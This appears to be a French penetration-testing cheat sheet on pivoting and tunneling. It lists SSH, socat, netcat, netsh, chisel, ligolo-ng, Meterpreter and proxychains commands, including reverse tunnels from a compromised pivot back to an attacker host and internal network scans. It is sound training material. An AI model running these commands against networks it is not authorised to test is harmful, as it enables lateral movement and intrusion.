# 12 — Pivoting, Tunneling & Port Forwarding

## Objectifs
Atteindre des réseaux non routables depuis l'attaquant : redirections de ports, tunnels SSH, SOCKS, chisel, ligolo-ng, proxychains, rebonds Windows.

---

## 1. Concepts

| Terme | Définition |
|---|---|
| **Pivot** | Hôte compromis servant de rebond |
| **Port forwarding** | Rediriger un port local ↔ distant |
| **Tunnel** | Encapsuler un protocole dans un autre |
| **SOCKS proxy** | Proxy générique pour tous les outils |

---

## 2. SSH — le couteau suisse

```bash
# Local port forwarding : accéder à un service distant via le pivot
ssh -L 8080:127.0.0.1:80 <USER>@<PIVOT>
# → http://127.0.0.1:8080

# Remote port forwarding : exposer un service local sur le pivot
ssh -R 9000:127.0.0.1:8000 <USER>@<PIVOT>
# Sur le pivot : curl http://127.0.0.1:9000 → notre 8000

# Dynamic (SOCKS5)
ssh -D 1080 -N -f <USER>@<PIVOT>
# proxychains4 curl http://10.10.10.20

# Jump host
ssh -J <USER>@<PIVOT> <USER>@<TARGET>
ssh -o ProxyCommand="ssh -W %h:%p <USER>@<PIVOT>" <USER>@<TARGET>

# Multiplexage / persistance
ssh -M -S /tmp/ctrl -fN -D 1080 <USER>@<PIVOT>
ssh -S /tmp/ctrl -O check <USER>@<PIVOT>

# Config ~/.ssh/config
Host pivot
  HostName <PIVOT>
  User <USER>
  DynamicForward 1080
```

### sshuttle (VPN-like)
```bash
sshuttle -r <USER>@<PIVOT> 10.10.10.0/24
sshuttle -r <USER>@<PIVOT> 10.10.10.0/24 --dns
```

---

## 3. « Poor man's » forwarding

### Linux
```bash
# Socat — écoute locale → cible interne
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.20:80

# Redirection inverse
socat TCP-LISTEN:9000,fork TCP:127.0.0.1:8000

# netcat
mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | nc 10.10.10.20 80 > /tmp/f
```

### Windows — netsh
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.20
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Windows — SSH natif
```powershell
ssh -L 8080:10.10.10.20:80 <USER>@<PIVOT>
```

---

## 4. Chisel (tunnel HTTP/WebSocket)

```bash
# Attaquant — serveur
chisel server -p 8080 --reverse --socks5

# Cible Linux
./chisel client <LHOST>:8080 R:socks

# Cible Windows
chisel.exe client <LHOST>:8080 R:socks

# Port forwarding spécifique (reverse)
./chisel client <LHOST>:8080 R:8080:10.10.10.20:80

# Forward simple (client écoute)
./chisel client <LHOST>:8080 9000:127.0.0.1:80
```

Puis `proxychains4` sur `127.0.0.1:1080`.

---

## 5. Ligolo-ng (TUN, plus rapide)

```bash
# Attaquant — proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Cible
./agent -connect <LHOST>:11601 -ignore-cert

# Console proxy
session
ifconfig                    # voir les réseaux de la cible
start                       # activer le tunnel
# Ajouter la route
sudo ip route add 10.10.10.0/24 dev ligolo

# Redirection de port (si pas de route)
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```

> Ligolo-ng donne une interface TUN : plus besoin de proxychains, tous les outils fonctionnent nativement.

---

## 6. Metasploit / Meterpreter

```text
# Route via une session
route add 10.10.10.0/24 <SESSION_ID>
autoroute -s 10.10.10.0/24 -i <SESSION_ID>

# Port forward
portfwd add -l 8080 -p 80 -r 10.10.10.20
portfwd list

# SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
```

---

## 7. Proxychains

```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
# ou
http 127.0.0.1 8080

# Usage
proxychains4 nmap -sT -Pn -p22,80,445 10.10.10.20
proxychains4 curl http://10.10.10.20
proxychains4 impacket-psexec <DOMAIN>/<USER>:<PASS>@10.10.10.20
```

> `nmap` doit utiliser `-sT` (connect) : `-sS` (raw) ne passe pas par un proxy SOCKS.

---

## 8. Redirections Windows

```cmd
# plink (PuTTY)
plink.exe -ssh -L 8080:10.10.10.20:80 <USER>@<LHOST>

# netsh
netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=10.10.10.20

# Port forwarding via Meterpreter
portfwd add -l 8080 -p 80 -r 10.10.10.20
```

---

## 9. Rebonds multiples

```bash
# Chaîne de proxychains
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081

# SSH chaîné
ssh -J user1@10.10.10.10,user2@10.10.10.20 user3@10.10.10.30

# Double pivot chisel
# 1) pivot1 → socks 1080
# 2) à travers 1080, uploader chisel sur pivot2 → socks 1081
```

---

## 10. Découverte du réseau interne

```bash
# Depuis le pivot
ip a; ip route
arp -a
netstat -tulpn
cat /etc/hosts

# Scan via tunnel
proxychains4 nmap -sT -Pn -p21,22,80,139,443,445,1433,3306,3389,5985 10.10.10.0/24

# Windows
cmd /c "for /L %i in (1,1,254) do @ping -n 1 -w 100 10.10.10.%i | findstr TTL"
```

---

## Checklist
- [ ] Réseaux internes identifiés depuis le pivot
- [ ] Moyen de pivot choisi (SSH/chisel/ligolo)
- [ ] Route ou proxy configuré
- [ ] Outils fonctionnels à travers le tunnel (`-sT` pour nmap)
- [ ] Double pivot si nécessaire
- [ ] Stabilité du tunnel vérifiée

## Choix rapide
| Situation | Solution |
|---|---|
| SSH dispo | `-D 1080` + proxychains |
| Pas de SSH, HTTP sortant | chisel |
| Besoin de perf / tous protocoles | ligolo-ng |
| Windows sans binaire | netsh portproxy |
| Trafic chiffré | socat OPENSSL / SSH |
